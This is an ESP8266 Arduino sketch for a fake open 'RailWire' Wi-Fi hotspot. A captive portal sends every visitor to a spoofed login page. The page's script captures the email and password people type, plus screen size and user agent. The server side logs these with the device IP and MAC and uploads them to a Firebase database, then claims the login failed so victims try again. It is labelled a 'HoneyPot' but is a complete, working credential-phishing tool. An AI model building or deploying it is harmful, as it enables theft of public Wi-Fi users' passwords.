#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <FirebaseESP8266.h>

#define WIFI_SSID "RailWire"  // Fake Wi-Fi Name
#define WIFI_PASSWORD ""       // Open Network (No Password)

#define FIREBASE_HOST "#"  
#define FIREBASE_AUTH "#"

DNSServer dnsServer;
ESP8266WebServer server(80);
FirebaseData firebaseData;
FirebaseAuth fbAuth;
FirebaseConfig fbConfig;

const char fakePage[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Railwire Free Wi-Fi Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #003366;
            color: white;
            text-align: center;
            margin: 0;
            padding: 0;
        }
        .container {
            width: 100%;
            max-width: 350px;
            margin: 80px auto;
            background: white;
            color: black;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0px 0px 10px rgba(255, 255, 255, 0.2);
        }
        h2 { margin: 10px 0; font-size: 18px; }
        input, button {
            width: 90%;
            padding: 10px;
            margin: 8px 0;
            border-radius: 5px;
            font-size: 14px;
        }
        button {
            background-color: #0066cc; color: white; border: none;
            cursor: pointer; transition: 0.3s;
        }
        button:hover { background-color: #004c99; }
    </style>
    <script>
        function captureInfo() {
            var email = document.getElementById('email').value;
            var password = document.getElementById('password').value;
            var screen = window.screen.width + "x" + window.screen.height;
            var userAgent = navigator.userAgent;

            fetch("/login?email=" + email + "&password=" + password + "&screen=" + screen + "&ua=" + encodeURIComponent(userAgent))
            .then(response => response.text())
            .then(data => document.body.innerHTML = "<h2>Invalid Credentials. Try Again.</h2>");
        }
    </script>
</head>
<body>
    <div class="container">
        <h2>Railwire Free Wi-Fi Login</h2>
        <p>Please enter your details to continue.</p>
        <input type="email" id="email" placeholder="Enter Email">
        <input type="password" id="password" placeholder="Enter Password">
        <button onclick="captureInfo()">Sign Up</button>
    </div>
</body>
</html>
)rawliteral";

void handleLogin() {
    String email = server.arg("email");
    String password = server.arg("password");
    String screenSize = server.arg("screen");
    String userAgent = server.arg("ua");
    String deviceIP = server.client().remoteIP().toString();

    uint8_t mac[6];
    WiFi.softAPmacAddress(mac);
    String macAddress = String(mac[0], HEX) + ":" + String(mac[1], HEX) + ":" + String(mac[2], HEX) + ":" +
                        String(mac[3], HEX) + ":" + String(mac[4], HEX) + ":" + String(mac[5], HEX);

    Serial.println("\nUser Captured:");
    Serial.println("Email: " + email);
    Serial.println("Password: " + password);
    Serial.println("Screen Size: " + screenSize);
    Serial.println("User Agent: " + userAgent);
    Serial.println("Device IP: " + deviceIP);
    Serial.println("MAC Address: " + macAddress);
    Serial.println("-----------------------------------");

    if (WiFi.status() != WL_CONNECTED) {
        Serial.println("Wi-Fi Not Connected! Data not sent to Firebase.");
        return;
    }

    if (Firebase.ready()) {
        bool success = Firebase.pushString(firebaseData, "/users/" + macAddress + "/email", email) &&
                       Firebase.pushString(firebaseData, "/users/" + macAddress + "/password", password) &&
                       Firebase.pushString(firebaseData, "/users/" + macAddress + "/IP", deviceIP) &&
                       Firebase.pushString(firebaseData, "/users/" + macAddress + "/MAC", macAddress) &&
                       Firebase.pushString(firebaseData, "/users/" + macAddress + "/Screen", screenSize) &&
                       Firebase.pushString(firebaseData, "/users/" + macAddress + "/UserAgent", userAgent);

        if (success) {
            Serial.println("Data stored in Firebase successfully!");
        } else {
            Serial.println("Firebase Write Failed: " + firebaseData.errorReason());
        }
    } else {
        Serial.println("Firebase is not ready! Error: " + firebaseData.errorReason());
    }

    server.send(200, "text/plain", "Login Failed! Try Again.");
}

void handleRoot() {
    server.send(200, "text/html", fakePage);
}

void handleRedirect() {
    server.sendHeader("Location", "http://192.168.4.1/", true);
    server.send(302, "text/plain", "");
}

void setup() {
    Serial.begin(115200);
    Serial.println("Starting ESP8266 HoneyPot...");

    WiFi.softAP(WIFI_SSID, WIFI_PASSWORD);
    Serial.println("WiFi AP Started: " + String(WIFI_SSID));
    Serial.println("AP IP Address: " + WiFi.softAPIP().toString());

    dnsServer.start(53, "*", WiFi.softAPIP());

    fbConfig.host = FIREBASE_HOST;
    fbConfig.signer.tokens.legacy_token = FIREBASE_AUTH;
    Firebase.begin(&fbConfig, &fbAuth);
    Firebase.reconnectWiFi(true);
    
    Serial.println("Checking Firebase Connection...");
    if (Firebase.ready()) {
        Serial.println("Firebase Connected Successfully!");
    } else {
        Serial.println("Firebase Connection Failed: " + firebaseData.errorReason());
    }

    server.on("/", handleRoot);
    server.on("/login", handleLogin);
    server.onNotFound(handleRedirect);

    server.begin();
    Serial.println("Web Server Started...");
}

void loop() {
    dnsServer.processNextRequest();
    server.handleClient();
}
